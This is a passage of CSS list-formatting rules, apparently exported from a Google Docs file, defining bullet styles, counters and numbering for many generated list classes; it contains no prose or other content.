0}.lst-kix_5yi4tofw6s0z-3&gt;li{counter-increment:lst-ctn-kix_5yi4tofw6s0z-3}ol.lst-kix_8mkn8rg9im4a-7{list-style-type:none}ol.lst-kix_8mkn8rg9im4a-6{list-style-type:none}ol.lst-kix_8mkn8rg9im4a-8{list-style-type:none}ol.lst-kix_8mkn8rg9im4a-3{list-style-type:none}ol.lst-kix_8mkn8rg9im4a-2{list-style-type:none}ol.lst-kix_58ja23nrczhl-7.start{counter-reset:lst-ctn-kix_58ja23nrczhl-7 0}.lst-kix_zcvcgbx5ju56-7&gt;li:before{content:\"-  \"}ol.lst-kix_8mkn8rg9im4a-5{list-style-type:none}ol.lst-kix_8mkn8rg9im4a-4{list-style-type:none}ul.lst-kix_t1ae57uxlfl0-3{list-style-type:none}ul.lst-kix_t1ae57uxlfl0-4{list-style-type:none}ol.lst-kix_hk8k8itxmlfp-6.start{counter-reset:lst-ctn-kix_hk8k8itxmlfp-6 0}ol.lst-kix_8mkn8rg9im4a-1{list-style-type:none}ul.lst-kix_t1ae57uxlfl0-1{list-style-type:none}.lst-kix_h1p96gz9lzq4-7&gt;li:before{content:\"-  \"}ol.lst-kix_8mkn8rg9im4a-0{list-style-type:none}ul.lst-kix_t1ae57uxlfl0-2{list-style-type:none}.lst-kix_yzib59bcdnhj-5&gt;li:before{content:\"-  \"}ul.lst-kix_t1ae57uxlfl0-0{list-style-type:none}.lst-kix_h1p96gz9lzq4-5&gt;li:before{content:\"-  \"}ul.lst-kix_t1ae57uxlfl0-7{list-style-type:none}.lst-kix_9prd8pa3o8y7-5&gt;li:before{content:\"\" counter(lst-ctn-kix_9prd8pa3o8y7-5,lower-roman) \". \"}ul.lst-kix_t1ae57uxlfl0-8{list-style-type:none}.lst-kix_yzib59bcdnhj-7&gt;li:before{content:\"-  \"}.lst-kix_51hgl6mwb3et-4&gt;li{counter-increment:lst-ctn-kix_51hgl6mwb3et-4}.lst-kix_p4ttii5g8cnl-4&gt;li{counter-increment:lst-ctn-kix_p4ttii5g8cnl-4}ul.lst-kix_t1ae57uxlfl0-5{list-style-type:none}ul.lst-kix_t1ae57uxlfl0-6{list-style-type:none}.lst-kix_7y90gfloiotx-0&gt;li{counter-increment:lst-ctn-kix_7y90gfloiotx-0}.lst-kix_5yi4tofw6s0z-0&gt;li:before{content:\"\" counter(lst-ctn-kix_5yi4tofw6s0z-0,decimal) \". \"}ol.lst-kix_hk8k8itxmlfp-2.start{counter-reset:lst-ctn-kix_hk8k8itxmlfp-2 0}.lst-kix_u3opzkdcnklc-6&gt;li:before{content:\"\" counter(lst-ctn-kix_u3opzkdcnklc-6,decimal) \". \"}.lst-kix_f96hgc2s4b68-6&gt;li:before{content:\"-  \"}.lst-kix_f96hgc2s4b68-3&gt;li:before{content:\"-  \"}.lst-kix_51hgl6mwb3et-8&gt;li{counter-increment:lst-ctn-kix_51hgl6mwb3et-8}ol.lst-kix_8mkn8rg9im4a-4.start{counter-reset:lst-ctn-kix_8mkn8rg9im4a-4 0}ol.lst-kix_58ja23nrczhl-2.start{counter-reset:lst-ctn-kix_58ja23nrczhl-2 0}.lst-kix_5yi4tofw6s0z-8&gt;li:before{content:\"\" counter(lst-ctn-kix_5yi4tofw6s0z-8,lower-roman) \". \"}ol.lst-kix_3a2g7o19wgb3-4.start{counter-reset:lst-ctn-kix_3a2g7o19wgb3-4 0}ol.lst-kix_7y90gfloiotx-5.start{counter-reset:lst-ctn-kix_7y90gfloiotx-5 0}.lst-kix_5yi4tofw6s0z-3&gt;li:before{content:\"\" counter(lst-ctn-kix_5yi4tofw6s0z-3,decimal) \". \"}.lst-kix_u3opzkdcnklc-1&gt;li:before{content:\"\" counter(lst-ctn-kix_u3opzkdcnklc-1,lower-latin) \". \"}.lst-kix_u3opzkdcnklc-0&gt;li{counter-increment:lst-ctn-kix_u3opzkdcnklc-0}ol.lst-kix_hk8k8itxmlfp-3.start{counter-reset:lst-ctn-kix_hk8k8itxmlfp-3 0}ol.lst-kix_p4ttii5g8cnl-8{list-style-type:none}.lst-kix_7y90gfloiotx-4&gt;li{counter-increment:lst-ctn-kix_7y90gfloiotx-4}.lst-kix_t1ae57uxlfl0-6&gt;li:before{content:\"-  \"}.lst-kix_u3opzkdcnklc-7&gt;li{counter-increment:lst-ctn-kix_u3opzkdcnklc-7}ol.lst-kix_3a2g7o19wgb3-5.start{counter-reset:lst-ctn-kix_3a2g7o19wgb3-5 0}.lst-kix_j5vmamheymgq-5&gt;li{counter-increment:lst-ctn-kix_j5vmamheymgq-5}.lst-kix_j5vmamheymgq-2&gt;li{counter-increment:lst-ctn-kix_j5vmamheymgq-2}.lst-kix_t1ae57uxlfl0-1&gt;li:before{content:\"-  \"}ol.lst-kix_58ja23nrczhl-3.start{counter-reset:lst-ctn-kix_58ja23nrczhl-3 0}ol.lst-kix_7y90gfloiotx-1.start{counter-reset:lst-ctn-kix_7y90gfloiotx-1 0}.lst-kix_p4ttii5g8cnl-8&gt;li{counter-increment:lst-ctn-kix_p4ttii5g8cnl-8}.lst-kix_g3pd9wzbzpzz-1&gt;li:before{content:\"-  \"}.lst-kix_aj3gpabmyk88-3&gt;li:before{content:\"-  \"}ol.lst-kix_58ja23nrczhl-0.start{counter-reset:lst-ctn-kix_58ja23nrczhl-0 0}.lst-kix_dqkfvt9lb2wy-3&gt;li:before{content:\"-  \"}ol.lst-kix_8mkn8rg9im4a-5.start{counter-reset:lst-ctn-kix_8mkn8rg9im4a-5 0}.lst-kix_6l3lpr6ytz51-1&gt;li:before{content:\"-  \"}.lst-kix_yjo4cwnqbjp0-3&gt;li:before{content:\"-  \"}.lst-kix_k47gmg94hbw2-8&gt;li:before{content:\"-  \"}.lst-kix_8mkn8rg9im4a-1&gt;li{counter-increment:lst-ctn-kix_8mkn8rg9im4a-1}.lst-kix_whw4pjgxp3w1-3&gt;li:before{content:\"-  \"}ol.lst-kix_p4ttii5g8cnl-3{list-style-type:none}ol.lst-kix_p4ttii5g8cnl-2{list-style-type:none}ol.lst-kix_p4ttii5g8cnl-1{list-style-type:none}.lst-kix_k47gmg94hbw2-0&gt;li:before{content:\"-  \"}ol.lst-kix_p4ttii5g8cnl-0{list-style-type:none}ol.lst-kix_3a2g7o19wgb3-0.start{counter-reset:lst-ctn-kix_3a2g7o19wgb3-0 0}.lst-kix_5oipgjcxugcr-0&gt;li:before{content:\"\" counter(lst-ctn-kix_5oipgjcxugcr-0,decimal) \". \"}ol.lst-kix_p4ttii5g8cnl-7{list-style-type:none}ol.lst-kix_p4ttii5g8cnl-6{list-style-type:none}ol.lst-kix_hk8k8itxmlfp-1.start{counter-reset:lst-ctn-kix_hk8k8itxmlfp-1 0}ol.lst-kix_p4ttii5g8cnl-5{list-style-type:none}ol.lst-kix_p4ttii5g8cnl-4{list-style-type:none}.lst-kix_mfudkcwv2w89-4&gt;li:before{content:\"\" counter(lst-ctn-kix_mfudkcwv2w89-4,lower-latin) \". \"}.lst-kix_5yi4tofw6s0z-7&gt;li{counter-increment:lst-ctn-kix_5yi4tofw6s0z-7}.lst-kix_yn2ql2u2egdg-6&gt;li:before{content:\"-  \"}.lst-kix_8mkn8rg9im4a-8&gt;li{counter-increment:lst-ctn-kix_8mkn8rg9im4a-8}ol.lst-kix_j5vmamheymgq-6{list-style-type:none}ol.lst-kix_3a2g7o19wgb3-3.start{counter-reset:lst-ctn-kix_3a2g7o19wgb3-3 0}ol.lst-kix_j5vmamheymgq-7{list-style-type:none}ol.lst-kix_j5vmamheymgq-8{list-style-type:none}.lst-kix_9gryrzygx46m-4&gt;li:before{content:\"-  \"}ol.lst-kix_8mkn8rg9im4a-3.start{counter-reset:lst-ctn-kix_8mkn8rg9im4a-3 0}.lst-kix_5oipgjcxugcr-8&gt;li:before{content:\"\" counter(lst-ctn-kix_5oipgjcxugcr-8,lower-roman) \". \"}ol.lst-kix_j5vmamheymgq-0{list-style-type:none}ol.lst-kix_j5vmamheymgq-1{list-style-type:none}ol.lst-kix_j5vmamheymgq-2{list-style-type:none}ol.lst-kix_j5vmamheymgq-3{list-style-type:none}.lst-kix_3a2g7o19wgb3-5&gt;li:before{content:\"\" counter(lst-ctn-kix_3a2g7o19wgb3-5,lower-roman) \". \"}ol.lst-kix_j5vmamheymgq-4{list-style-type:none}ol.lst-kix_j5vmamheymgq-5{list-style-type:none}ol.lst-kix_hk8k8itxmlfp-0.start{counter-reset:lst-ctn-kix_hk8k8itxmlfp-0 0}.lst-kix_yzib59bcdnhj-2&gt;li:before{content:\"-  \"}.lst-kix_3a2g7o19wgb3-3&gt;li{counter-increment:lst-ctn-kix_3a2g7o19wgb3-3}.lst-kix_8chkxhfzc2ds-2&gt;li:before{content:\"-  \"}.lst-kix_mfudkcwv2w89-2&gt;li{counter-increment:lst-ctn-kix_mfudkcwv2w89-2}.lst-kix_1m9wqzg4mvqt-1&gt;li:before{content:\"-  \"}ol.lst-kix_8mkn8rg9im4a-2.start{counter-reset:lst-ctn-kix_8mkn8rg9im4a-2 0}.lst-kix_5oipgjcxugcr-5&gt;li{counter-increment:lst-ctn-kix_5oipgjcxugcr-5}.lst-kix_j5vmamheymgq-6&gt;li:before{content:\"\" counter(lst-ctn-kix_j5vmamheymgq-6,decimal) \". \"}ul.lst-kix_8chkxhfzc2ds-4{list-style-type:none}.lst-kix_9prd8pa3o8y7-0&gt;li:before{content:\"\" counter(lst-ctn-kix_9prd8pa3o8y7-0,decimal) \". \"}.lst-kix_9prd8pa3o8y7-8&gt;li:before{content:\"\" counter(lst-ctn-kix_9prd8pa3o8y7-8,lower-roman) \". \"}ul.lst-kix_8chkxhfzc2ds-3{list-style-type:none}ul.lst-kix_8chkxhfzc2ds-2{list-style-type:none}ul.lst-kix_8chkxhfzc2ds-1{list-style-type:none}.lst-kix_h1p96gz9lzq4-2&gt;li:before{content:\"-  \"}ul.lst-kix_8chkxhfzc2ds-8{list-style-type:none}ul.lst-kix_8chkxhfzc2ds-7{list-style-type:none}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}ul.lst-kix_8chkxhfzc2ds-6{list-style-type:none}.lst-kix_5yi4tofw6s0z-0&gt;li{counter-increment:lst-ctn-kix_5yi4tofw6s0z-0}ul.lst-kix_8chkxhfzc2ds-5{list-style-type:none}.lst-kix_51hgl6mwb3et-1&gt;li{counter-increment:lst-ctn-kix_51hgl6mwb3et-1}.lst-kix_p4ttii5g8cnl-1&gt;li{counter-increment:lst-ctn-kix_p4ttii5g8cnl-1}.lst-kix_7y90gfloiotx-2&gt;li:before{content:\"\" counter(lst-ctn-kix_7y90gfloiotx-2,lower-roman) \". \"}ul.lst-kix_8chkxhfzc2ds-0{list-style-type:none}ol.lst-kix_58ja23nrczhl-1.start{counter-reset:lst-ctn-kix_58ja23nrczhl-1 0}.lst-kix_8mkn8rg9im4a-5&gt;li:before{content:\"\" counter(lst-ctn-kix_8mkn8rg9im4a-5,lower-roman) \". \"}ol.lst-kix_7y90gfloiotx-0.start{counter-reset:lst-ctn-kix_7y90gfloiotx-0 0}ol.lst-kix_3a2g7o19wgb3-2.start{counter-reset:lst-ctn-kix_3a2g7o19wgb3-2 0}.lst-kix_zcvcgbx5ju56-4&gt;li:before{content:\"-  \"}.lst-kix_p4ttii5g8cnl-2&gt;li{counter-increment:lst-ctn-kix_p4ttii5g8cnl-2}ol.lst-kix_hk8k8itxmlfp-5.start{counter-reset:lst-ctn-kix_hk8k8itxmlfp-5 0}.lst-kix_5oipgjcxugcr-4&gt;li{counter-increment:lst-ctn-kix_5oipgjcxugcr-4}.lst-kix_9prd8pa3o8y7-2&gt;li{counter-increment:lst-ctn-kix_9prd8pa3o8y7-2}ol.lst-kix_3a2g7o19wgb3-6{list-style-type:none}ol.lst-kix_3a2g7o19wgb3-5{list-style-type:none}ol.lst-kix_3a2g7o19wgb3-4{list-style-type:none}ol.lst-kix_3a2g7o19wgb3-3{list-style-type:none}ol.lst-kix_3a2g7o19wgb3-8{list-style-type:none}ol.lst-kix_3a2g7o19wgb3-7{list-style-type:none}ol.lst-kix_3a2g7o19wgb3-7.start{counter-reset:lst-ctn-kix_3a2g7o19wgb3-7 0}ol.lst-kix_p4ttii5g8cnl-4.start{counter-reset:lst-ctn-kix_p4ttii5g8cnl-4 0}.lst-kix_iptxq54yrrnf-8&gt;li{counter-increment:lst-ctn-kix_iptxq54yrrnf-8}.lst-kix_5yi4tofw6s0z-5&gt;li{counter-increment:lst-ctn-kix_5yi4tofw6s0z-5}.lst-kix_58ja23nrczhl-0&gt;li{counter-increment:lst-ctn-kix_58ja23nrczhl-0}ol.lst-kix_8mkn8rg9im4a-7.start{counter-reset:lst-ctn-kix_8mkn8rg9im4a-7 0}.lst-kix_hk8k8itxmlfp-8&gt;li{counter-increment:lst-ctn-kix_hk8k8itxmlfp-8}ul.lst-kix_zcvcgbx5ju56-1{list-style-type:none}ul.lst-kix_zcvcgbx5ju56-2{list-style-type:none}ul.lst-kix_zcvcgbx5ju56-0{list-style-type:none}ul.lst-kix_zcvcgbx5ju56-5{list-style-type:none}.lst-kix_8mkn8rg9im4a-6&gt;li{counter-increment:lst-ctn-kix_8mkn8rg9im4a-6}ul.lst-kix_zcvcgbx5ju56-6{list-style-type:none}ul.lst-kix_zcvcgbx5ju56-3{list-style-type:none}ul.lst-kix_zcvcgbx5ju56-4{list-style-type:none}ol.lst-kix_5yi4tofw6s0z-7.start{counter-reset:lst-ctn-kix_5yi4tofw6s0z-7 0}.lst-kix_aj3gpabmyk88-8&gt;li:before{content:\"-  \"}ol.lst-kix_5oipgjcxugcr-6.start{counter-reset:lst-ctn-kix_5oipgjcxugcr-6 0}.lst-kix_aj3gpabmyk88-4&gt;li:before{content:\"-  \"}.lst-kix_mfudkcwv2w89-6&gt;li{counter-increment:lst-ctn-kix_mfudkcwv2w89-6}.lst-kix_aj3gpabmyk88-2&gt;li:before{content:\"-  \"}.lst-kix_8mkn8rg9im4a-8&gt;li:before{content:\"\" counter(lst-ctn-kix_8mkn8rg9im4a-8,lower-roman) \". \"}.lst-kix_1m9wqzg4mvqt-8&gt;li:before{content:\"-  \"}.lst-kix_aj3gpabmyk88-0&gt;li:before{content:\"-  \"}.lst-kix_mfudkcwv2w89-5&gt;li{counter-increment:lst-ctn-kix_mfudkcwv2w89-5}ol.lst-kix_51hgl6mwb3et-8{list-style-type:none}.lst-kix_hk8k8itxmlfp-0&gt;li{counter-increment:lst-ctn-kix_hk8k8itxmlfp-0}.lst-kix_iptxq54yrrnf-0&gt;li{counter-increment:lst-ctn-kix_iptxq54yrrnf-0}.lst-kix_51hgl6mwb3et-5&gt;li{counter-increment:lst-ctn-kix_51hgl6mwb3et-5}ol.lst-kix_58ja23nrczhl-6.start{counter-reset:lst-ctn-kix_58ja23nrczhl-6 0}ol.lst-kix_j5vmamheymgq-1.start{counter-reset:lst-ctn-kix_j5vmamheymgq-1 0}ol.lst-kix_51hgl6mwb3et-6{list-style-type:none}ol.lst-kix_51hgl6mwb3et-7{list-style-type:none}ol.lst-kix_51hgl6mwb3et-4{list-style-type:none}ol.lst-kix_51hgl6mwb3et-5{list-style-type:none}ol.lst-kix_51hgl6mwb3et-2{list-style-type:none}ol.lst-kix_51hgl6mwb3et-3{list-style-type:none}ol.lst-kix_51hgl6mwb3et-0{list-style-type:none}ol.lst-kix_51hgl6mwb3et-1{list-style-type:none}.lst-kix_hk8k8itxmlfp-7&gt;li{counter-increment:lst-ctn-kix_hk8k8itxmlfp-7}ol.lst-kix_7y90gfloiotx-6.start{counter-reset:lst-ctn-kix_7y90gfloiotx-6 0}.lst-kix_iptxq54yrrnf-7&gt;li{counter-increment:lst-ctn-kix_iptxq54yrrnf-7}.lst-kix_iptxq54yrrnf-1&gt;li{counter-increment:lst-ctn-kix_iptxq54yrrnf-1}ol.lst-kix_3a2g7o19wgb3-2{list-style-type:none}.lst-kix_hk8k8itxmlfp-1&gt;li{counter-increment:lst-ctn-kix_hk8k8itxmlfp-1}ol.lst-kix_3a2g7o19wgb3-1{list-style-type:none}ol.lst-kix_3a2g7o19wgb3-0{list-style-type:none}.lst-kix_1m9wqzg4mvqt-0&gt;li:before{content:\"-  \"}.lst-kix_8mkn8rg9im4a-0&gt;li:before{content:\"\" counter(lst-ctn-kix_8mkn8rg9im4a-0,decimal) \". \"}.lst-kix_1m9wqzg4mvqt-4&gt;li:before{content:\"-  \"}.lst-kix_8mkn8rg9im4a-2&gt;li:before{content:\"\" counter(lst-ctn-kix_8mkn8rg9im4a-2,lower-roman) \". \"}ol.lst-kix_mfudkcwv2w89-5.start{counter-reset:lst-ctn-kix_mfudkcwv2w89-5 0}.lst-kix_1m9wqzg4mvqt-6&gt;li:before{content:\"-  \"}.lst-kix_7y90gfloiotx-7&gt;li:before{content:\"\" counter(lst-ctn-kix_7y90gfloiotx-7,lower-latin) \". \"}.lst-kix_3a2g7o19wgb3-6&gt;li{counter-increment:lst-ctn-kix_3a2g7o19wgb3-6}.lst-kix_8mkn8rg9im4a-6&gt;li:before{content:\"\" counter(lst-ctn-kix_8mkn8rg9im4a-6,decimal) \". \"}.lst-kix_7y90gfloiotx-1&gt;li:before{content:\"\" counter(lst-ctn-kix_7y90gfloiotx-1,lower-latin) \". \"}.lst-kix_7y90gfloiotx-5&gt;li:before{content:\"\" counter(lst-ctn-kix_7y90gfloiotx-5,lower-roman) \". \"}.lst-kix_8mkn8rg9im4a-4&gt;li:before{content:\"\" counter(lst-ctn-kix_8mkn8rg9im4a-4,lower-latin) \". \"}.lst-kix_1m9wqzg4mvqt-2&gt;li:before{content:\"-  \"}.lst-kix_aj3gpabmyk88-6&gt;li:before{content:\"-  \"}.lst-kix_7y90gfloiotx-3&gt;li:before{content:\"\" counter(lst-ctn-kix_7y90gfloiotx-3,decimal) \". \"}ul.lst-kix_6l3lpr6ytz51-8{list-style-type:none}.lst-kix_8mkn8rg9im4a-5&gt;li{counter-increment:lst-ctn-kix_8mkn8rg9im4a-5}ol.lst-kix_mfudkcwv2w89-4.start{counter-reset:lst-ctn-kix_mfudkcwv2w89-4 0}ul.lst-kix_6l3lpr6ytz51-7{list-style-type:none}ul.lst-kix_6l3lpr6ytz51-4{list-style-type:none}ol.lst-kix_u3opzkdcnklc-6.start{counter-reset:lst-ctn-kix_u3opzkdcnklc-6 0}ul.lst-kix_6l3lpr6ytz51-3{list-style-type:none}ul.lst-kix_6l3lpr6ytz51-6{list-style-type:none}ul.lst-kix_6l3lpr6ytz51-5{list-style-type:none}ul.lst-kix_6l3lpr6ytz51-0{list-style-type:none}ul.lst-kix_6l3lpr6ytz51-2{list-style-type:none}ol.lst-kix_u3opzkdcnklc-8{list-style-type:none}ul.lst-kix_6l3lpr6ytz51-1{list-style-type:none}ol.lst-kix_u3opzkdcnklc-7{list-style-type:none}ol.lst-kix_u3opzkdcnklc-6{list-style-type:none}ol.lst-kix_u3opzkdcnklc-5{list-style-type:none}ol.lst-kix_u3opzkdcnklc-4{list-style-type:none}ol.lst-kix_9prd8pa3o8y7-0.start{counter-reset:lst-ctn-kix_9prd8pa3o8y7-0 0}ol.lst-kix_j5vmamheymgq-2.start{counter-reset:lst-ctn-kix_j5vmamheymgq-2 0}ol.lst-kix_iptxq54yrrnf-6.start{counter-reset:lst-ctn-kix_iptxq54yrrnf-6 0}.lst-kix_3a2g7o19wgb3-0&gt;li{counter-increment:lst-ctn-kix_3a2g7o19wgb3-0}.lst-kix_f96hgc2s4b68-1&gt;li:before{content:\"-  \"}.lst-kix_f96hgc2s4b68-0&gt;li:before{content:\"-  \"}.lst-kix_f96hgc2s4b68-5&gt;li:before{content:\"-  \"}.lst-kix_f96hgc2s4b68-4&gt;li:before{content:\"-  \"}.lst-kix_5yi4tofw6s0z-6&gt;li:before{content:\"\" counter(lst-ctn-kix_5yi4tofw6s0z-6,decimal) \". \"}.lst-kix_9prd8pa3o8y7-3&gt;li{counter-increment:lst-ctn-kix_9prd8pa3o8y7-3}ul.lst-kix_yjo4cwnqbjp0-8{list-style-type:none}.lst-kix_5yi4tofw6s0z-1&gt;li:before{content:\"\" counter(lst-ctn-kix_5yi4tofw6s0z-1,lower-latin) \". \"}.lst-kix_5yi4tofw6s0z-2&gt;li:before{content:\"\" counter(lst-ctn-kix_5yi4tofw6s0z-2,lower-roman) \". \"}ul.lst-kix_yjo4cwnqbjp0-4{list-style-type:none}ul.lst-kix_yjo4cwnqbjp0-5{list-style-type:none}ul.lst-kix_yjo4cwnqbjp0-6{list-style-type:none}ul.lst-kix_yjo4cwnqbjp0-7{list-style-type:none}ul.lst-kix_yjo4cwnqbjp0-0{list-style-type:none}.lst-kix_5yi4tofw6s0z-5&gt;li:before{content:\"\" counter(lst-ctn-kix_5yi4tofw6s0z-5,lower-roman) \". \"}ul.lst-kix_yjo4cwnqbjp0-1{list-style-type:none}.lst-kix_8mkn8rg9im4a-7&gt;li{counter-increment:lst-ctn-kix_8mkn8rg9im4a-7}ul.lst-kix_yjo4cwnqbjp0-2{list-style-type:none}.lst-kix_f96hgc2s4b68-8&gt;li:before{content:\"-  \"}ul.lst-kix_yjo4cwnqbjp0-3{list-style-type:none}ol.lst-kix_iptxq54yrrnf-0.start{counter-reset:lst-ctn-kix_iptxq54yrrnf-0 0}ol.lst-kix_51hgl6mwb3et-5.start{counter-reset:lst-ctn-kix_51hgl6mwb3et-5 0}.lst-kix_58ja23nrczhl-1&gt;li{counter-increment:lst-ctn-kix_58ja23nrczhl-1}.lst-kix_5yi4tofw6s0z-4&gt;li{counter-increment:lst-ctn-kix_5yi4tofw6s0z-4}ol.lst-kix_u3opzkdcnklc-1.start{counter-reset:lst-ctn-kix_u3opzkdcnklc-1 0}.lst-kix_u3opzkdcnklc-4&gt;li{counter-increment:lst-ctn-kix_u3opzkdcnklc-4}ol.lst-kix_iptxq54yrrnf-1.start{counter-reset:lst-ctn-kix_iptxq54yrrnf-1 0}ol.lst-kix_51hgl6mwb3et-4.start{counter-reset:lst-ctn-kix_51hgl6mwb3et-4 0}ol.lst-kix_9prd8pa3o8y7-5.start{counter-reset:lst-ctn-kix_9prd8pa3o8y7-5 0}.lst-kix_3a2g7o19wgb3-7&gt;li{counter-increment:lst-ctn-kix_3a2g7o19wgb3-7}.lst-kix_t1ae57uxlfl0-8&gt;li:before{content:\"-  \"}.lst-kix_t1ae57uxlfl0-3&gt;li:before{content:\"-  \"}.lst-kix_t1ae57uxlfl0-7&gt;li:before{content:\"-  \"}.lst-kix_t1ae57uxlfl0-4&gt;li:before{content:\"-  \"}ol.lst-kix_u3opzkdcnklc-3{list-style-type:none}ol.lst-kix_u3opzkdcnklc-2{list-style-type:none}ol.lst-kix_u3opzkdcnklc-1{list-style-type:none}.lst-kix_9prd8pa3o8y7-1&gt;li{counter-increment:lst-ctn-kix_9prd8pa3o8y7-1}ol.lst-kix_u3opzkdcnklc-0{list-style-type:none}.lst-kix_t1ae57uxlfl0-0&gt;li:before{content:\"-  \"}ol.lst-kix_u3opzkdcnklc-0.start{counter-reset:lst-ctn-kix_u3opzkdcnklc-0 0}.lst-kix_58ja23nrczhl-8&gt;li{counter-increment:lst-ctn-kix_58ja23nrczhl-8}.lst-kix_9prd8pa3o8y7-8&gt;li{counter-increment:lst-ctn-kix_9prd8pa3o8y7-8}.lst-kix_7y90gfloiotx-0&gt;li:before{content:\"\" counter(lst-ctn-kix_7y90gfloiotx-0,decimal) \". \"}.lst-kix_1m9wqzg4mvqt-7&gt;li:before{content:\"-  \"}.lst-kix_aj3gpabmyk88-1&gt;li:before{content:\"-  \"}.lst-kix_58ja23nrczhl-8&gt;li:before{content:\"\" counter(lst-ctn-kix_58ja23nrczhl-8,lower-roman) \". \"}ol.lst-kix_9prd8pa3o8y7-4.start{counter-reset:lst-ctn-kix_9prd8pa3o8y7-4 0}.lst-kix_k47gmg94hbw2-6&gt;li:before{content:\"-  \"}ol.lst-kix_mfudkcwv2w89-0.start{counter-reset:lst-ctn-kix_mfudkcwv2w89-0 0}.lst-kix_j5vmamheymgq-6&gt;li{counter-increment:lst-ctn-kix_j5vmamheymgq-6}.lst-kix_k47gmg94hbw2-2&gt;li:before{content:\"-  \"}.lst-kix_u3opzkdcnklc-6&gt;li{counter-increment:lst-ctn-kix_u3opzkdcnklc-6}ol.lst-kix_u3opzkdcnklc-5.start{counter-reset:lst-ctn-kix_u3opzkdcnklc-5 0}ol.lst-kix_51hgl6mwb3et-0.start{counter-reset:lst-ctn-kix_51hgl6mwb3et-0 0}.lst-kix_9gryrzygx46m-6&gt;li:before{content:\"-  \"}.lst-kix_7y90gfloiotx-3&gt;li{counter-increment:lst-ctn-kix_7y90gfloiotx-3}ol.lst-kix_j5vmamheymgq-7.start{counter-reset:lst-ctn-kix_j5vmamheymgq-7 0}.lst-kix_9gryrzygx46m-2&gt;li:before{content:\"-  \"}.lst-kix_zcvcgbx5ju56-2&gt;li:before{content:\"-  \"}.lst-kix_5yi4tofw6s0z-6&gt;li{counter-increment:lst-ctn-kix_5yi4tofw6s0z-6}.lst-kix_zcvcgbx5ju56-6&gt;li:before{content:\"-  \"}.lst-kix_7y90gfloiotx-8&gt;li:before{content:\"\" counter(lst-ctn-kix_7y90gfloiotx-8,lower-roman) \". \"}.lst-kix_8mkn8rg9im4a-7&gt;li:before{content:\"\" counter(lst-ctn-kix_8mkn8rg9im4a-7,lower-latin) \". \"}.lst-kix_7y90gfloiotx-4&gt;li:before{content:\"\" counter(lst-ctn-kix_7y90gfloiotx-4,lower-latin) \". \"}.lst-kix_51hgl6mwb3et-7&gt;li{counter-increment:lst-ctn-kix_51hgl6mwb3et-7}ol.lst-kix_p4ttii5g8cnl-0.start{counter-reset:lst-ctn-kix_p4ttii5g8cnl-0 0}.lst-kix_8mkn8rg9im4a-3&gt;li:before{content:\"\" counter(lst-ctn-kix_8mkn8rg9im4a-3,decimal) \". \"}.lst-kix_1m9wqzg4mvqt-3&gt;li:before{content:\"-  \"}ol.lst-kix_iptxq54yrrnf-5.start{counter-reset:lst-ctn-kix_iptxq54yrrnf-5 0}.lst-kix_aj3gpabmyk88-5&gt;li:before{content:\"-  \"}ol.lst-kix_j5vmamheymgq-6.start{counter-reset:lst-ctn-kix_j5vmamheymgq-6 0}ol.lst-kix_9prd8pa3o8y7-3.start{counter-reset:lst-ctn-kix_9prd8pa3o8y7-3 0}ol.lst-kix_hk8k8itxmlfp-2{list-style-type:none}ol.lst-kix_hk8k8itxmlfp-1{list-style-type:none}ol.lst-kix_hk8k8itxmlfp-0{list-style-type:none}ol.lst-kix_hk8k8itxmlfp-8{list-style-type:none}ol.lst-kix_hk8k8itxmlfp-7{list-style-type:none}ol.lst-kix_hk8k8itxmlfp-6{list-style-type:none}ol.lst-kix_hk8k8itxmlfp-5{list-style-type:none}ol.lst-kix_hk8k8itxmlfp-4{list-style-type:none}ol.lst-kix_hk8k8itxmlfp-3{list-style-type:none}ul.lst-kix_k47gmg94hbw2-6{list-style-type:none}ul.lst-kix_k47gmg94hbw2-7{list-style-type:none}ul.lst-kix_k47gmg94hbw2-8{list-style-type:none}.lst-kix_9prd8pa3o8y7-0&gt;li{counter-increment:lst-ctn-kix_9prd8pa3o8y7-0}ol.lst-kix_j5vmamheymgq-5.start{counter-reset:lst-ctn-kix_j5vmamheymgq-5 0}ol.lst-kix_5yi4tofw6s0z-3.start{counter-reset:lst-ctn-kix_5yi4tofw6s0z-3 0}ul.lst-kix_k47gmg94hbw2-0{list-style-type:none}ul.lst-kix_k47gmg94hbw2-1{list-style-type:none}ul.lst-kix_k47gmg94hbw2-2{list-style-type:none}ul.lst-kix_yzib59bcdnhj-8{list-style-type:none}ul.lst-kix_k47gmg94hbw2-3{list-style-type:none}ul.lst-kix_yzib59bcdnhj-7{list-style-type:none}ul.lst-kix_k47gmg94hbw2-4{list-style-type:none}ul.lst-kix_yzib59bcdnhj-6{list-style-type:none}ul.lst-kix_k47gmg94hbw2-5{list-style-type:none}.lst-kix_p4ttii5g8cnl-0&gt;li{counter-increment:lst-ctn-kix_p4ttii5g8cnl-0}ul.lst-kix_yzib59bcdnhj-5{list-style-type:none}.lst-kix_iptxq54yrrnf-3&gt;li:before{content:\"\" counter(lst-ctn-kix_iptxq54yrrnf-3,decimal) \". \"}ul.lst-kix_yzib59bcdnhj-4{list-style-type:none}ul.lst-kix_yzib59bcdnhj-3{list-style-type:none}ul.lst-kix_yzib59bcdnhj-2{list-style-type:none}ul.lst-kix_yzib59bcdnhj-1{list-style-type:none}.lst-kix_iptxq54yrrnf-1&gt;li:before{content:\"\" counter(lst-ctn-kix_iptxq54yrrnf-1,lower-latin) \". \"}ul.lst-kix_yzib59bcdnhj-0{list-style-type:none}.lst-kix_iptxq54yrrnf-0&gt;li:before{content:\"\" counter(lst-ctn-kix_iptxq54yrrnf-0,decimal) \". \"}ol.lst-kix_5oipgjcxugcr-2.start{counter-reset:lst-ctn-kix_5oipgjcxugcr-2 0}.lst-kix_mfudkcwv2w89-0&gt;li{counter-increment:lst-ctn-kix_mfudkcwv2w89-0}.lst-kix_hk8k8itxmlfp-6&gt;li{counter-increment:lst-ctn-kix_hk8k8itxmlfp-6}.lst-kix_p4ttii5g8cnl-1&gt;li:before{content:\"\" counter(lst-ctn-kix_p4ttii5g8cnl-1,lower-latin) \". \"}.lst-kix_p4ttii5g8cnl-2&gt;li:before{content:\"\" counter(lst-ctn-kix_p4ttii5g8cnl-2,lower-roman) \". \"}.lst-kix_3a2g7o19wgb3-8&gt;li{counter-increment:lst-ctn-kix_3a2g7o19wgb3-8}.lst-kix_5oipgjcxugcr-6&gt;li{counter-increment:lst-ctn-kix_5oipgjcxugcr-6}.lst-kix_p4ttii5g8cnl-4&gt;li:before{content:\"\" 